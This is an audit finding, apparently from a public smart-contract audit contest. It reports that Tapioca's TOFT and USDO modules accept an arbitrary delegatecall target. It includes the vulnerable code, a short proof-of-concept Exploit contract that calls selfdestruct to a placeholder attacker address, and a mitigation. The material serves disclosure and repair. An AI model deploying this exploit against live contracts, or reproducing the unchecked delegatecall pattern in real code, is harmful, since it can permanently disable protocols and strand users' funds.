[H-28] TOFT and USDO Modules Can Be Selfdestructed
Submitted byAck, also found byBPZ,Breeje,ladboy233,offside0011,Kaysoft,0x73696d616f,0xrugpull_detector,carrotsmuggler,CrypticShepherd,ACai,kodyvim, andcergyk
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTLeverageModule.sol#L184-L193
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTMarketModule.sol#L160-L168
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L189-L200>
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L152-L162
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOLeverageModule.sol#L169-L1788
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOMarketModule.sol#L168-L176
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/usd0/modules/USDOOptionsModule.sol#L174-L185
All TOFT and USDO modules have public functions that allow an attacker to supply an addressmodulethat is later used as a destination for a delegatecall. This can point to an attacker-controlled contract that is used to selfdestruct the module.
// USDOLeverageModule:leverageUpfunctionleverageUp(addressmodule,uint16_srcChainId,bytesmemory_srcAddress,uint64_nonce,bytesmemory_payload)public{// .. snip ..(boolsuccess,bytesmemoryreason) =module.delegatecall(//@audit-issue arbitrary destination delegatecallabi.encodeWithSelector(this.leverageUpInternal.selector,amount,swapData,externalData,lzData,leverageFor));if(!success) {if(balanceAfter-balanceBefore>=amount) {IERC20(address(this)).safeTransfer(leverageFor,amount);}revert(_getRevertMsg(reason));//forward revert because it's handled by the main executor}// .. snip ..}
Impact
Both BaseTOFT and BaseUSDO initialize the module addresses to state variables in the constructor. Because there are no setter functions to adjust these variables post-deployment, the modules are permanently locked to the addresses specified in the constructor. If those addresses are selfdestructed, the modules are rendered unusable and all calls to these modules will revert. This cannot be repaired.
BaseUSDO.sol:constructor
// BaseUSDO.sol:constructorconstructor(address_lzEndpoint,IYieldBoxBase_yieldBox,address_owner,addresspayable_leverageModule,addresspayable_marketModule,addresspayable_optionsModule)BaseUSDOStorage(_lzEndpoint,_yieldBox)ERC20Permit("USDO") {leverageModule=USDOLeverageModule(_leverageModule);marketModule=USDOMarketModule(_marketModule);optionsModule=USDOOptionsModule(_optionsModule);transferOwnership(_owner);}
Proof of Concept
Attacker can deploy theExploitcontract below, and then call each of the vulnerable functions with the address of theExploitcontract as themoduleparameter. This will cause the module to selfdestruct, rendering it unusable.
pragmasolidity^0.8.18;contractExploit{addresspayableconstantattacker=payable(address(0xbadbabe));fallback()externalpayable{selfdestruct(attacker);}}
Recommended Mitigation Steps
Themoduleparameter should be removed from the calldata in each of the vulnerable functions. Since the context of the call into these functions are designed to be delegatecalls and the storage layouts of the modules and the Base contracts are the same, themoduleaddress can be retreived from storage instead. This will prevent attackers from supplying arbitrary addresses as delegatecall destinations.
0xRektora (Tapioca) confirmed via duplicate issue 146